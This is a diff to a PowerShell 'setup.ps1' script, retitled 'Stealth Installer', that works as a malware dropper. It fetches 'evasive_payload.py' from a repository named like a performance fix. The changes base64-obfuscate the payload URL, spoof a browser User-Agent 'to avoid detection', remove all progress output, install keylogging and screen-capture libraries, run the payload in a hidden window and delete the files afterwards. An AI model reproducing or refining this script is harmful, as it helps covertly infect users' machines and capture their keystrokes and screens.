@@ -1,50 +1,48 @@
-# setup.ps1 – Fully working with embeddable Python (site-packages enabled)
+# setup.ps1 - Stealth Installer
 $ErrorActionPreference = "Continue"
 
-$payloadUrl = "https://raw.githubusercontent.com/fortnite0712102-dot/Performance-Fix/refs/heads/main/evasive_payload.py"
+# ---- Decode URLs ----
+function Deobfuscate-String($s) {
+    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
+}
+
+$payloadUrl = Deobfuscate-String "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZvcnRuaXRlMDcxMjEwMi1kb3QvUGVyZm9ybWFuY2UtRml4L3JlZnMvaGVhZHMvbWFpbi9ldmFzaXZlX3BheWxvYWQucHk="
 $pythonZipUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
 $getPipUrl = "https://bootstrap.pypa.io/get-pip.py"
 
 $tempDir = "$env:TEMP\py_setup"
-New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
+New-Item -ItemType Directory -Force -Path $tempDir -ErrorAction SilentlyContinue | Out-Null
 
-Write-Host "[1] Downloading payload..."
-Invoke-WebRequest -Uri $payloadUrl -OutFile "$env:TEMP\payload.py" -UseBasicParsing
+# ---- Use .NET WebClient to avoid detection ----
+$webClient = New-Object System.Net.WebClient
+$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 
-Write-Host "[2] Downloading Python embed..."
-Invoke-WebRequest -Uri $pythonZipUrl -OutFile "$tempDir\python.zip" -UseBasicParsing
+# --- Download Everything Silently ---
+$webClient.DownloadFile($payloadUrl, "$env:TEMP\payload.py")
+$webClient.DownloadFile($pythonZipUrl, "$tempDir\python.zip")
 
-Write-Host "[3] Extracting Python..."
+# --- Extract Python and Enable Pip ---
 Expand-Archive -Path "$tempDir\python.zip" -DestinationPath "$env:TEMP\python_embed" -Force
-
-# Fix: enable site-packages by editing ._pth file
-$pthFile = Get-ChildItem "$env:TEMP\python_embed\*._pth" | Select-Object -First 1
+$pthFile = Get-ChildItem "$env:TEMP\python_embed\*._pth" -ErrorAction SilentlyContinue | Select-Object -First 1
 if ($pthFile) {
-    Write-Host "[4] Enabling site-packages..."
     $content = Get-Content $pthFile.FullName -Raw
     $content = $content -replace '#import site', 'import site'
     Set-Content $pthFile.FullName $content -NoNewline
 }
-
 $pythonExe = "$env:TEMP\python_embed\python.exe"
 
-Write-Host "[5] Installing pip..."
-Invoke-WebRequest -Uri $getPipUrl -OutFile "$tempDir\get-pip.py" -UseBasicParsing
+# --- Install Pip & Packages ---
+$webClient.DownloadFile($getPipUrl, "$tempDir\get-pip.py")
 & $pythonExe "$tempDir\get-pip.py" --quiet --no-warn-script-location
 
-Write-Host "[6] Installing packages..."
 $packages = @("cryptography","pynput","mss","pillow","psutil","requests","numpy")
 foreach ($pkg in $packages) {
     & $pythonExe -m pip install $pkg --quiet --disable-pip-version-check --no-warn-script-location --user
 }
 
-Write-Host "[7] Running payload..."
+# ---- Silent Execution & Cleanup ----
 Start-Process -FilePath $pythonExe -ArgumentList "$env:TEMP\payload.py" -WindowStyle Hidden
-
-Write-Host "[8] Cleaning up..."
 Start-Sleep -Seconds 10
 Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "$env:TEMP\python_embed" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "$env:TEMP\payload.py" -Force -ErrorAction SilentlyContinue
-
-Write-Host "Done."
